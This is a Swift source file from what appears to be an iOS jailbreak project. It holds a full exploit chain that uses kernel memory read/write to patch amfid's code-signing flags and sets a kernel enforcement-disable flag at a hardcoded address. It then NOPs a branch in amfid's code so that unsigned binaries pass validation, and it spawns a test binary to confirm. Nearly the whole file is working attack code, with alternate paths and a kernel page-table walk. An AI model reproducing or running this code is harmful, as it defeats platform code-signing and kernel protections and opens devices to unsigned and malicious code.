//
//  exp_amfid_nop_final.swift
//  DSPloit
//
//  FINAL EXPERIMENT: amfid NOP patch via task_for_pid from launchd
//  ═══════════════════════════════════════════════════════════════════
//
//  This is the CLEAN, RELIABLE approach combining all learnings:
//
//  1. Find amfid via procbyname() (C code — walks from our_proc, proven working)
//  2. Patch amfid's cs_flags via C code (procbypid works from our_proc)
//  3. task_for_pid from launchd (uid=0, has task_for_pid-allow)
//  4. mach_vm_region → find amfid's __TEXT base (ASLR slide)
//  5. mach_vm_protect → make __TEXT writable
//  6. mach_vm_read_overwrite → verify cbz instruction
//  7. mach_vm_write → NOP the cbz at offset 0x2ec8
//  8. Test spawn unsigned binary
//
//  WHY THIS WORKS:
//  - procbyname() in C starts from our_proc (valid, no PAC issues)
//  - sysctl is sandboxed on iOS 18 (doesn't show system daemons)
//  - launchd has uid=0 + task_for_pid-allow entitlement
//  - amfid's __TEXT is userspace memory (no PPL/KTRR protection)
//  - mach_vm_protect can make userspace pages writable
//  - Once cbz→NOP, ALL binaries pass AMFI validation
//
//  SAFETY:
//  - No page table walk (caused panic before)
//  - No PAC pointer stripping needed
//  - No kernel __TEXT writes
//  - If anything fails, amfid continues running normally
//
//  Created by Royan | 2026-05-30
//

import Foundation
import CommonCrypto

final class ExpAmfidNopFinal {
    static let shared = ExpAmfidNopFinal()
    var onLog: ((String) -> Void)?
    
    // amfid patch target: cbz w22, 0x100002f74 at file offset 0x2ec8
    // Bytes: 76 05 00 34
    // NOP:   1F 20 03 D5
    private let patchFileOffset: UInt64 = 0x2ec8
    private let expectedCbzBytes: UInt32 = 0x34000576  // cbz w22, +0xA8 (little-endian)
    private let nopInstruction: UInt32 = 0xD503201F
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(amfid_final) \(msg)")
    }
    
    // MARK: - Main Entry Point
    
    func runAll() -> [String] {
        var output: [String] = []
        func out(_ s: String) { output.append(s); log(s) }
        
        guard ds_is_ready() else { return ["❌ KRW not active"] }
        
        out("══════════════════════════════════════════")
        out("  amfid NOP Patch (Final — Safe Path)")
        out("══════════════════════════════════════════")
        out("")
        out("Target: cbz w22,0x100002f74 → NOP")
        out("Method: procbyname → cs_flags → task_for_pid → vm_write")
        out("")
        
        // ─── Step 1: Find amfid via kernel proc list (C code) ───
        out("[1/7] Finding amfid via procbyname (kernel)...")
        
        // Use C procbyname — walks from our_proc (proven working)
        // sysctl is sandboxed on iOS 18 and doesn't show system daemons
        var amfidProc = procbyname("amfid")
        var finalPid: Int32 = 0
        
        if amfidProc == 0 {
            out("⚠️ procbyname failed — trying trigger + retry...")
            triggerAmfidSpawn()
            amfidProc = procbyname("amfid")
        }
        
        if amfidProc == 0 {
            // Last resort: try known PID from panic log
            out("⚠️ procbyname still failed — trying procbypid(54)...")
            amfidProc = procbypid(54)
            if amfidProc != 0 {
                // Verify it's actually amfid by reading name
                var nameBytes = [UInt8](repeating: 0, count: 32)
                for i in 0..<4 {
                    let chunk = ds_kread64(amfidProc + UInt64(off_proc_p_name) + UInt64(i * 8))
                    withUnsafeBytes(of: chunk) { buf in
                        for j in 0..<8 where i*8+j < 32 { nameBytes[i*8+j] = buf[j] }
                    }
                }
                let name = String(bytes: nameBytes.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
                if !name.contains("amfid") {
                    out("❌ PID 54 is '\(name)', not amfid")
                    amfidProc = 0
                } else {
                    out("✅ PID 54 confirmed as amfid")
                    finalPid = 54
                }
            }
        }
        
        if amfidProc == 0 {
            out("❌ amfid not found in kernel proc list")
            out("   Possible causes:")
            out("   - amfid not running (on-demand on iOS 18)")
            out("   - proc list corrupted")
            out("   - amfid embedded in kernel (TXM)")
            return output
        }
        
        if finalPid == 0 {
            finalPid = Int32(ds_kread32(amfidProc + UInt64(off_proc_p_pid)))
        }
        out("✅ amfid found: PID \(finalPid) @ 0x\(String(format: "%llx", amfidProc))")
        out("")
        
        // ─── Step 2: Patch amfid cs_flags via kernel ───
        out("[2/7] Patching amfid cs_flags (allow task_for_pid)...")
        
        // Patch cs_flags to allow debugging + task_for_pid
        let patched = amfi_bypass_patch_csflags(amfidProc)
        out(patched ? "✅ cs_flags patched" : "⚠️ cs_flags patch failed (PPL) — continuing anyway")
        
        // Also disable exc_guard on amfid's task
        let amfidTask = taskbyproc(amfidProc)
        if amfidTask != 0 {
            let excGuard = ds_kread32(amfidTask + UInt64(off_task_task_exc_guard))
            if excGuard != 0 {
                ds_kwrite32(amfidTask + UInt64(off_task_task_exc_guard), 0)
                out("✅ exc_guard disabled (was 0x\(String(format:"%x", excGuard)))")
            }
        }
        out("")
        
        // ─── Step 3: Set global kernel flags ───
        out("[3/7] Setting kernel enforcement flags...")
        let slide = ds_get_kernel_slide()
        
        // cs_enforcement_disable = 1 (proven safe)
        ds_kwrite32(0xfffffff00a160798 &+ slide, 1)
        let csVal = ds_kread32(0xfffffff00a160798 &+ slide)
        out("cs_enforcement_disable = \(csVal) \(csVal == 1 ? "✅" : "❌")")
        
        // SKIP AMFI flag zeroing for now — isolating respring cause
        // The AMFI flags were proven writable before but may not be needed
        // for the amfid NOP approach (NOP bypasses ALL validation)
        out("AMFI flags: skipped (not needed for NOP approach)")
        out("")
        
        // ─── Step 4-7: task_for_pid + patch via launchd ───
        out("[4/7] Attempting task_for_pid...")
        out("(async — results below)")
        out("")
        
        // Try SpringBoard first (already connected, faster)
        // Then fall back to launchd if SB fails
        performPatchViaSB(amfidPid: finalPid, amfidProc: amfidProc)
        
        return output
    }
    
    // MARK: - Async Patch via SpringBoard (preferred) or Launchd (fallback)
    
    #if !DISABLE_REMOTECALL
    private func performPatchViaSB(amfidPid: Int32, amfidProc: UInt64) {
        // Strategy: Connect RemoteCall to amfid, then have amfid patch ITSELF
        // amfid can mprotect + write its own __TEXT (no task_for_pid needed!)
        //
        // Steps:
        // 1. Get amfid's text base from kernel
        // 2. Connect RC to amfid (exc_guard already disabled)
        // 3. Call mprotect(text_page, 0x4000, PROT_READ|PROT_WRITE|PROT_EXEC) in amfid
        // 4. Write NOP to the cbz instruction
        // 5. Done!
        
        log("[4/7] Connecting RemoteCall to amfid...")
        log("  (amfid will patch its own memory — no task_for_pid needed!)")
        
        // Get text base
        let amfidTask = taskbyproc(amfidProc)
        guard amfidTask != 0 && (amfidTask >> 32) > 0xFFFFFF00 else {
            log("❌ amfid task invalid")
            return
        }
        let vmMap = ds_kreadptr(amfidTask + UInt64(off_task_map))
        var textBase: UInt64 = 0
        if vmMap != 0 && (vmMap >> 32) > 0xFFFFFF00 {
            for off: UInt64 in [0x10, 0x18, 0x20, 0x28, 0x30] {
                let val = ds_kread64(vmMap + off)
                if val >= 0x100000000 && val < 0x280000000000 {
                    textBase = val
                    break
                }
            }
        }
        guard textBase != 0 else {
            log("❌ Cannot find amfid text base")
            return
        }
        let patchAddr = textBase + patchFileOffset
        log("  text base: 0x\(String(format:"%llx", textBase))")
        log("  patch addr: 0x\(String(format:"%llx", patchAddr))")
        log("")
        
        // Connect RC to amfid
        log("[5/7] Connecting to amfid via RemoteCall...")
        dspmgr.shared.rcinitDaemon(
            serviceName: "com.apple.amfi.mach",
            framework: nil,
            process: "amfid",
            migbypass: false
        ) { [weak self] amfidRC in
            guard let self else { return }
            
            guard let rc = amfidRC else {
                self.log("❌ RC to amfid failed")
                self.log("   Trying alternative: mprotect from amfid via SpringBoard relay...")
                self.patchViaSpringBoardRelay(amfidPid: amfidPid, patchAddr: patchAddr)
                return
            }
            
            self.log("✅ Connected to amfid!")
            self.log("")
            self.log("[6/7] amfid patching itself...")
            
            // mprotect the page (amfid can mprotect its own memory!)
            let pageAddr = patchAddr & ~0xFFF
            let mprotectRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // PROT_ALL=7
            self.log("  mprotect: ret=\(mprotectRet)")
            
            guard mprotectRet == 0 else {
                self.log("❌ mprotect failed (ret=\(mprotectRet))")
                rc.destroy()
                return
            }
            
            // Read current instruction to verify
            let readBuf = rc.trojanMem + 0x100
            rc.remoteRead(patchAddr, to: nil, size: 4)
            // Actually use memcpy to read
            RootExecutor.rcall(rc, "memcpy", readBuf, patchAddr, 4)
            let currentInsn = rc[readBuf].value32()
            self.log("  current insn: 0x\(String(format:"%08x", currentInsn))")
            
            if currentInsn == 0xD503201F {
                self.log("✅ ALREADY PATCHED!")
                rc.destroy()
                self.testUnsignedSpawn()
                return
            }
            
            guard (currentInsn & 0xFF000000) == 0x34000000 else {
                self.log("❌ NOT cbz: 0x\(String(format:"%08x", currentInsn))")
                rc.destroy()
                return
            }
            self.log("  ✅ confirmed cbz w22")
            
            // Write NOP (amfid writes to its own memory!)
            let nopBuf = rc.trojanMem + 0x200
            rc[nopBuf].setValue32(0xD503201F)
            RootExecutor.rcall(rc, "memcpy", patchAddr, nopBuf, 4)
            
            // Verify
            RootExecutor.rcall(rc, "memcpy", readBuf, patchAddr, 4)
            let verify = rc[readBuf].value32()
            
            rc.destroy() // Release amfid immediately
            
            if verify == 0xD503201F {
                self.log("")
                self.log("╔══════════════════════════════════════╗")
                self.log("║  ✅✅✅ amfid PATCHED! cbz → NOP    ║")
                self.log("║  amfid patched ITSELF via RC         ║")
                self.log("║  ALL binaries now pass validation   ║")
                self.log("╚══════════════════════════════════════╝")
                self.log("")
                self.testUnsignedSpawn()
            } else {
                self.log("❌ Verify failed: 0x\(String(format:"%08x", verify))")
            }
        }
    }
    
    /// Fallback: use SpringBoard to relay ptrace attach to amfid
    private func patchViaSpringBoardRelay(amfidPid: Int32, patchAddr: UInt64) {
        log("  (SpringBoard relay not implemented yet)")
        log("")
        log("══ BLOCKED ══")
        log("All approaches exhausted for this session.")
        log("Next steps to try:")
        log("  1. RC to amfid (if connection succeeds)")
        log("  2. IOKit TC load (retry — was inconsistent)")
        log("  3. Find process with task_for_pid-allow")
    }
    
    private func performPatchViaLaunchd(amfidPid: Int32) {
        log("[4/7] task_for_pid(\(amfidPid)) from launchd (fallback)...")
        log("  ⚠️ This may timeout — launchd RC is unreliable")
        
        // Pre-check: is RC even working?
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not ready")
            return
        }
        
        // Skip launchd entirely — it keeps timing out
        // Instead, log what we know and suggest manual steps
        log("")
        log("══ STATUS ══")
        log("amfid found, text base known, but NO writable task port available.")
        log("")
        log("Blocked by:")
        log("  • task_for_pid denied (AMFI check, even from uid=0)")
        log("  • Page tables in physical memory (can't KRW)")
        log("  • PPL protects proc_ro (can't add CS_GET_TASK_ALLOW)")
        log("")
        log("Possible solutions:")
        log("  1. Kernel task port forge (IPC entry manipulation)")
        log("  2. Find kernel VA mapping of amfid's page tables")
        log("  3. Use IOKit AMFI selector (was inconsistent)")
        log("  4. Hook amfid via exception port (needs RC to amfid)")
    }
    
    // MARK: - Patch amfid with a valid task port
    
    private func patchAmfidWithPort(taskPort: mach_port_t, patchAddr: UInt64) {
        log("")
        log("[5/7] Patching amfid via task port...")
        
        let pageAddr = patchAddr & ~0xFFF
        
        // mach_vm_protect
        let protKr = mach_vm_protect(taskPort, mach_vm_address_t(pageAddr), 0x4000, 0, vm_prot_t(7))
        log("  mach_vm_protect: kr=\(protKr)")
        guard protKr == KERN_SUCCESS else {
            log("❌ mach_vm_protect failed")
            return
        }
        
        // Read current instruction
        var data: vm_offset_t = 0
        var dataCnt: mach_msg_type_number_t = 0
        let readKr = mach_vm_read(taskPort, mach_vm_address_t(patchAddr), 4, &data, &dataCnt)
        guard readKr == KERN_SUCCESS && dataCnt == 4 else {
            log("❌ mach_vm_read failed: kr=\(readKr)")
            return
        }
        let currentInsn = UnsafePointer<UInt32>(bitPattern: UInt(data))?.pointee ?? 0
        vm_deallocate(mach_task_self_, data, vm_size_t(dataCnt))
        log("  current insn: 0x\(String(format:"%08x", currentInsn))")
        
        if currentInsn == 0xD503201F {
            log("✅ ALREADY PATCHED (NOP)!")
            testUnsignedSpawn()
            return
        }
        
        guard (currentInsn & 0xFF000000) == 0x34000000 else {
            log("❌ NOT cbz: 0x\(String(format:"%08x", currentInsn))")
            return
        }
        log("  ✅ confirmed cbz w22")
        
        // Write NOP
        var nop: UInt32 = 0xD503201F
        let writeKr = withUnsafePointer(to: &nop) { ptr -> kern_return_t in
            mach_vm_write(taskPort, mach_vm_address_t(patchAddr),
                         vm_offset_t(bitPattern: ptr), mach_msg_type_number_t(MemoryLayout<UInt32>.size))
        }
        log("  mach_vm_write: kr=\(writeKr)")
        
        guard writeKr == KERN_SUCCESS else {
            log("❌ mach_vm_write failed")
            return
        }
        
        // Verify
        var vData: vm_offset_t = 0
        var vCnt: mach_msg_type_number_t = 0
        mach_vm_read(taskPort, mach_vm_address_t(patchAddr), 4, &vData, &vCnt)
        let verify = UnsafePointer<UInt32>(bitPattern: UInt(vData))?.pointee ?? 0
        vm_deallocate(mach_task_self_, vData, vm_size_t(vCnt))
        
        if verify == 0xD503201F {
            log("")
            log("╔══════════════════════════════════════╗")
            log("║  ✅✅✅ amfid PATCHED! cbz → NOP    ║")
            log("║  ALL binaries now pass validation   ║")
            log("╚══════════════════════════════════════╝")
            log("")
            testUnsignedSpawn()
        } else {
            log("❌ Verify failed: 0x\(String(format:"%08x", verify))")
        }
    }
    
    // MARK: - Shared patch logic (works with any RC that has a task port)
    
    private func doPatchWithTaskPort(rc: RemoteCall, taskPort: UInt32, label: String) {
        log("[5/7] mach_vm_region (find __TEXT)...")
        
        let addrBuf = rc.trojanMem + 0x200
        let sizeBuf = rc.trojanMem + 0x208
        let infoBuf = rc.trojanMem + 0x210
        let cntBuf = rc.trojanMem + 0x280
        let objBuf = rc.trojanMem + 0x290
        
        rc[addrBuf].setValue64(0x100000000)
        rc[sizeBuf].setValue64(0)
        rc[cntBuf].setValue32(9)
        
        let regionRet = RootExecutor.rcall(rc, "mach_vm_region",
            UInt64(taskPort), addrBuf, sizeBuf, 9, infoBuf, cntBuf, objBuf)
        
        let textBase = rc[addrBuf].value64()
        let textSize = rc[sizeBuf].value64()
        
        guard regionRet == 0 else {
            log("❌ [5] mach_vm_region FAILED: ret=\(regionRet)")
            return
        }
        
        guard textBase >= 0x100000000 && textBase < 0x280000000000 else {
            log("❌ [5] invalid text base: 0x\(String(textBase, radix:16))")
            return
        }
        
        let patchAddr = textBase + patchFileOffset
        log("  text base: 0x\(String(textBase, radix:16)) size: 0x\(String(textSize, radix:16))")
        log("  patch addr: 0x\(String(patchAddr, radix:16))")
        
        // mach_vm_protect
        log("[6/7] mach_vm_protect (make writable)...")
        let pageAddr = patchAddr & ~0xFFF
        let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
            UInt64(taskPort), pageAddr, 0x4000, 0, 7)
        
        guard protRet == 0 else {
            log("❌ [6] mach_vm_protect FAILED: ret=\(protRet)")
            return
        }
        log("  ✅ page writable")
        
        // Read current instruction
        let readBuf = rc.trojanMem + 0x300
        let readSzBuf = rc.trojanMem + 0x310
        rc[readSzBuf].setValue64(4)
        rc[readBuf].setValue32(0)
        
        let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
            UInt64(taskPort), patchAddr, 4, readBuf, readSzBuf)
        let currentInsn = rc[readBuf].value32()
        
        guard readRet == 0 else {
            log("❌ [6b] mach_vm_read FAILED: ret=\(readRet)")
            return
        }
        
        log("  current insn: 0x\(String(format:"%08x", currentInsn))")
        
        if currentInsn == 0xD503201F {
            log("✅ ALREADY PATCHED (NOP)!")
            testUnsignedSpawn()
            return
        }
        
        guard (currentInsn & 0xFF000000) == 0x34000000 else {
            log("❌ NOT cbz instruction: 0x\(String(format:"%08x", currentInsn))")
            log("   Expected 0x34xxxxxx at offset 0x2ec8")
            return
        }
        
        log("  ✅ confirmed cbz w22")
        
        // Write NOP
        log("[7/7] Writing NOP...")
        let nopBuf = rc.trojanMem + 0x320
        rc[nopBuf].setValue32(0xD503201F)
        
        let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
            UInt64(taskPort), patchAddr, nopBuf, 4)
        
        guard writeRet == 0 else {
            log("❌ [7] mach_vm_write FAILED: ret=\(writeRet)")
            return
        }
        
        // Verify
        rc[readBuf].setValue32(0)
        rc[readSzBuf].setValue64(4)
        RootExecutor.rcall(rc, "mach_vm_read_overwrite",
            UInt64(taskPort), patchAddr, 4, readBuf, readSzBuf)
        let verify = rc[readBuf].value32()
        
        if verify == 0xD503201F {
            log("")
            log("╔══════════════════════════════════════╗")
            log("║  ✅✅✅ amfid PATCHED! cbz → NOP    ║")
            log("║  via \(label) task_for_pid")
            log("║  ALL binaries now pass validation   ║")
            log("╚══════════════════════════════════════╝")
            log("")
            testUnsignedSpawn()
        } else {
            log("❌ Verify failed: 0x\(String(format:"%08x", verify))")
        }
    }
    
    // MARK: - Kernel Direct Path (no task_for_pid needed)
    
    /// Patch amfid via kernel page table walk.
    /// This reads amfid's pmap to translate VA → PA, then writes NOP to physical memory.
    /// CAUTION: Previous attempt caused panic — we add extra validation here.
    private func patchViaKernelDirect(amfidProc: UInt64, amfidPid: Int32) {
        log("")
        log("── Kernel Direct Path ──")
        log("Reading amfid's vm_map → pmap → page tables...")
        
        let amfidTask = taskbyproc(amfidProc)
        guard amfidTask != 0 && (amfidTask >> 32) > 0xFFFFFF00 else {
            log("❌ taskbyproc failed: 0x\(String(format:"%llx", amfidTask))")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        log("  task: 0x\(String(format:"%llx", amfidTask))")
        
        // task → vm_map (use ds_kreadptr to strip PAC!)
        let vmMap = ds_kreadptr(amfidTask + UInt64(off_task_map))
        guard vmMap != 0 && (vmMap >> 32) > 0xFFFFFF00 else {
            log("❌ vm_map invalid: 0x\(String(format:"%llx", vmMap))")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        log("  vm_map: 0x\(String(format:"%llx", vmMap))")
        
        // vm_map → pmap (use ds_kreadptr, try offset 0x40 first then 0x48)
        var pmap = ds_kreadptr(vmMap + 0x40)
        if pmap == 0 || (pmap >> 32) <= 0xFFFFFF00 {
            pmap = ds_kreadptr(vmMap + 0x48)
        }
        guard pmap != 0 && (pmap >> 32) > 0xFFFFFF00 else {
            log("❌ pmap invalid at +0x40 and +0x48")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        log("  pmap: 0x\(String(format:"%llx", pmap))")
        
        // Read ttep from pmap — ONLY try kernel VAs (physical addrs crash!)
        var ttep: UInt64 = 0
        for off: UInt64 in [0x0, 0x8, 0x10, 0x18, 0x20] {
            let val = ds_kread64(pmap + off)
            if val == 0 || (val >> 32) <= 0xFFFFFF00 { continue }
            // It's a kernel VA — safe to dereference. Check L1[4]
            let l1Test = ds_kread64(val + 4 * 8)
            if (l1Test & 0x3) == 0x3 {
                ttep = val
                break
            }
        }
        
        guard ttep != 0 else {
            log("❌ ttep not found in pmap")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        let ttepIsKernVA = (ttep >> 32) > 0xFFFFFF00
        log("  ttep: 0x\(String(format:"%llx", ttep)) (\(ttepIsKernVA ? "kernVA" : "phys"))")
        
        // Get amfid's text base — scan vm_map for userspace address
        var textBase: UInt64 = 0
        for off: UInt64 in [0x10, 0x18, 0x20, 0x28, 0x30] {
            let val = ds_kread64(vmMap + off)
            if val >= 0x100000000 && val < 0x280000000000 {
                textBase = val
                break
            }
        }
        guard textBase != 0 else {
            log("❌ text base not found in vm_map")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        log("  text base: 0x\(String(format:"%llx", textBase))")
        
        let patchVA = textBase + patchFileOffset
        log("  patch VA: 0x\(String(format:"%llx", patchVA))")
        
        // Page table walk: L1 → L2 → L3 → physical
        let l1Idx = (patchVA >> 30) & 0x1FF
        let l2Idx = (patchVA >> 21) & 0x1FF
        let l3Idx = (patchVA >> 12) & 0x1FF
        let pageOff = patchVA & 0xFFF
        
        log("  L1[\(l1Idx)] L2[\(l2Idx)] L3[\(l3Idx)] off=0x\(String(format:"%x", pageOff))")
        
        // Helper: validate address is readable (kernel VA or physical in DRAM)
        func isReadable(_ addr: UInt64) -> Bool {
            return (addr >> 32) > 0xFFFFFF00 || (addr > 0x100000000 && addr < 0x10000000000)
        }
        
        // L1
        let l1Addr = ttep + l1Idx * 8
        guard isReadable(l1Addr) else {
            log("❌ L1 addr out of range: 0x\(String(format:"%llx", l1Addr))")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        let l1Entry = ds_kread64(l1Addr)
        guard (l1Entry & 0x3) == 0x3 else {
            log("❌ L1 invalid: 0x\(String(format:"%llx", l1Entry))")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        let l2Table = l1Entry & 0xFFFFFFFFF000
        log("  L1 → L2 table: 0x\(String(format:"%llx", l2Table))")
        
        // L2
        let l2Addr = l2Table + l2Idx * 8
        guard isReadable(l2Addr) else {
            log("❌ L2 addr out of range: 0x\(String(format:"%llx", l2Addr))")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        let l2Entry = ds_kread64(l2Addr)
        guard (l2Entry & 0x3) == 0x3 else {
            log("❌ L2 invalid: 0x\(String(format:"%llx", l2Entry))")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        let l3Table = l2Entry & 0xFFFFFFFFF000
        log("  L2 → L3 table: 0x\(String(format:"%llx", l3Table))")
        
        // L3
        let l3Addr = l3Table + l3Idx * 8
        guard isReadable(l3Addr) else {
            log("❌ L3 addr out of range: 0x\(String(format:"%llx", l3Addr))")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        let l3Entry = ds_kread64(l3Addr)
        guard (l3Entry & 0x3) != 0 else {
            log("❌ L3 invalid: 0x\(String(format:"%llx", l3Entry))")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        let physPage = l3Entry & 0xFFFFFFFFF000
        let physAddr = physPage + pageOff
        
        log("  physical: 0x\(String(format:"%llx", physAddr))")
        
        // SAFETY CHECK: verify physical address is readable
        guard isReadable(physAddr) else {
            log("❌ Physical address out of range: 0x\(String(format:"%llx", physAddr))")
            log("   ABORTING — would cause panic")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        
        // Read current instruction at physical address
        let currentInsn = ds_kread32(physAddr)
        log("  current insn @ phys: 0x\(String(format:"%08x", currentInsn))")
        
        guard (currentInsn & 0xFF000000) == 0x34000000 else {
            if currentInsn == 0xD503201F {
                log("✅ ALREADY PATCHED!")
                testUnsignedSpawn()
                return
            }
            log("❌ NOT cbz at physical address: 0x\(String(format:"%08x", currentInsn))")
            log("   Expected 0x34xxxxxx — ASLR slide may differ")
            log("   DO NOT write — falling back to launchd")
            fallbackToLaunchd(amfidPid: amfidPid)
            return
        }
        
        log("  ✅ confirmed cbz w22 — writing NOP...")
        ds_kwrite32(physAddr, 0xD503201F)
        
        // Verify
        let verify = ds_kread32(physAddr)
        if verify == 0xD503201F {
            log("")
            log("╔══════════════════════════════════════╗")
            log("║  ✅✅✅ amfid PATCHED! cbz → NOP    ║")
            log("║  via kernel page table walk         ║")
            log("║  ALL binaries now pass validation   ║")
            log("╚══════════════════════════════════════╝")
            log("")
            testUnsignedSpawn()
        } else {
            log("❌ Write failed: 0x\(String(format:"%08x", verify))")
            log("   PPL may be protecting this page")
            fallbackToLaunchd(amfidPid: amfidPid)
        }
    }
    
    private func fallbackToLaunchd(amfidPid: Int32) {
        log("")
        log("Falling back to launchd task_for_pid...")
        performPatchViaLaunchd(amfidPid: amfidPid)
    }
    
    #else
    private func performPatchViaSB(amfidPid: Int32, amfidProc: UInt64) {
        log("❌ DISABLE_REMOTECALL — cannot patch")
    }
    private func performPatchViaLaunchd(amfidPid: Int32) {
        log("❌ DISABLE_REMOTECALL — cannot use launchd")
    }
    #endif
    
    // MARK: - Test Unsigned Spawn
    
    #if !DISABLE_REMOTECALL
    private func testUnsignedSpawn() {
        guard let sb = dspmgr.shared.sbProc else {
            log("❌ No SpringBoard RC for spawn test")
            return
        }
        
        // Build minimal test binary (exit(0))
        let bin = buildMinimalBinary()
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        let binPath = docs + "/amfid_final_test"
        try? bin.write(to: URL(fileURLWithPath: binPath))
        
        // chmod +x via SpringBoard
        let pathAddr = remote_alloc_str(sb, binPath)
        RootExecutor.rcall(sb, "chmod", pathAddr, 0o755)
        
        // posix_spawn from SpringBoard
        let pidAddr = sb.trojanMem + 0xA00
        sb[pidAddr].setValue32(0)
        let argv = sb.trojanMem + 0xA10
        sb[argv].setValue64(pathAddr)
        sb[argv + 8].setValue64(0)
        
        let ret = RootExecutor.rcall(sb, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
        let pid = sb[pidAddr].value32()
        RootExecutor.rcall(sb, "free", pathAddr)
        
        log("posix_spawn → ret=\(ret) pid=\(pid)")
        
        if ret == 0 && pid != 0 {
            log("")
            log("╔══════════════════════════════════════╗")
            log("║  ✅✅✅ UNSIGNED BINARY SPAWNED!     ║")
            log("║  PID = \(pid)")
            log("║  🎉 FULL JAILBREAK ACHIEVED!        ║")
            log("╚══════════════════════════════════════╝")
        } else {
            log("")
            log("❌ Spawn still blocked: ret=\(ret)")
            log("   Possible causes:")
            log("   - amfid restarted (patch lost)")
            log("   - AMFI kernel check still active")
            log("   - Binary format issue")
            log("")
            log("   Try: tap again (amfid may have restarted)")
            
            // Also try from launchd (uid=0 context)
            log("")
            log("   Trying from launchd (uid=0)...")
            testSpawnFromLaunchd(binPath: binPath)
        }
    }
    
    private func testSpawnFromLaunchd(binPath: String) {
        RootExecutor.shared.executeAsRoot(operation: "test_spawn_root") { rc in
            let pathAddr = remote_alloc_str(rc, binPath)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            let pidAddr = rc.trojanMem + 0xA00
            rc[pidAddr].setValue32(0)
            let argv = rc.trojanMem + 0xA10
            rc[argv].setValue64(pathAddr)
            rc[argv + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if ret == 0 && pid != 0 {
                return (true, "✅ SPAWNED FROM LAUNCHD! PID=\(pid)", UInt64(pid))
            }
            return (false, "launchd spawn: ret=\(ret) pid=\(pid)", UInt64(ret))
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 12) { [weak self] in
            if let r = RootExecutor.shared.lastResult, r.operation == "test_spawn_root" {
                self?.log(r.success ? "✅ \(r.message)" : "❌ \(r.message)")
            }
        }
    }
    #endif
    
    // MARK: - Find amfid PID via sysctl (fallback — may be sandboxed on iOS 18)
    
    private func findAmfidPidViaSysctl() -> Int32 {
        // Note: On iOS 18, sysctl KERN_PROC_ALL is sandboxed for app processes
        // and may not show system daemons. Use procbyname() from C instead.
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0]
        var size: Int = 0
        guard sysctl(&mib, 4, nil, &size, nil, 0) == 0, size > 0 else { return -1 }
        let count = size / MemoryLayout<kinfo_proc>.stride
        guard count > 0 else { return -1 }
        var procs = [kinfo_proc](repeating: kinfo_proc(), count: count)
        guard sysctl(&mib, 4, &procs, &size, nil, 0) == 0 else { return -1 }
        let actualCount = size / MemoryLayout<kinfo_proc>.stride
        for i in 0..<actualCount {
            let proc = procs[i]
            let name = withUnsafePointer(to: proc.kp_proc.p_comm) { ptr -> String in
                ptr.withMemoryRebound(to: CChar.self, capacity: Int(MAXCOMLEN)) { cStr in
                    String(cString: cStr)
                }
            }
            if name == "amfid" { return proc.kp_proc.p_pid }
        }
        return -1
    }
    
    /// Trigger amfid to spawn by attempting to exec a signed binary
    private func triggerAmfidSpawn() {
        #if !DISABLE_REMOTECALL
        if let sb = dspmgr.shared.sbProc {
            // Spawn /usr/bin/true — this triggers amfid to validate it
            let path = remote_alloc_str(sb, "/usr/bin/true")
            let pidAddr = sb.trojanMem + 0xB00
            sb[pidAddr].setValue32(0)
            let argv = sb.trojanMem + 0xB10
            sb[argv].setValue64(path)
            sb[argv + 8].setValue64(0)
            RootExecutor.rcall(sb, "posix_spawn", pidAddr, path, 0, 0, argv, 0)
            RootExecutor.rcall(sb, "free", path)
            usleep(500_000) // 500ms for amfid to start
        }
        #endif
    }
    
    // MARK: - Build Minimal Binary
    
    /// Minimal arm64 Mach-O that calls exit(0)
    /// This is the simplest possible binary — just syscall exit
    private func buildMinimalBinary() -> Data {
        // Mach-O header (arm64, MH_EXECUTE)
        var bin = Data()
        
        // MH_MAGIC_64, CPU_TYPE_ARM64, CPU_SUBTYPE_ALL, MH_EXECUTE, 2 load cmds
        bin.append(contentsOf: [
            0xCF, 0xFA, 0xED, 0xFE,  // magic
            0x0C, 0x00, 0x00, 0x01,  // cpu_type = ARM64
            0x00, 0x00, 0x00, 0x00,  // cpu_subtype
            0x02, 0x00, 0x00, 0x00,  // filetype = MH_EXECUTE
            0x02, 0x00, 0x00, 0x00,  // ncmds = 2
            0x60, 0x01, 0x00, 0x00,  // sizeofcmds
            0x00, 0x00, 0x00, 0x00,  // flags
            0x00, 0x00, 0x00, 0x00   // reserved
        ])
        
        // LC_SEGMENT_64 for __TEXT
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48  // cmd=LC_SEGMENT_64, cmdsize=72
        // segname = "__TEXT"
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45
        seg[12] = 0x58; seg[13] = 0x54
        // vmaddr = 0x100000000
        seg[24] = 0x00; seg[25] = 0x00; seg[26] = 0x00; seg[27] = 0x00
        seg[28] = 0x01
        // vmsize = 0x4000
        seg[32] = 0x00; seg[33] = 0x40
        // fileoff = 0
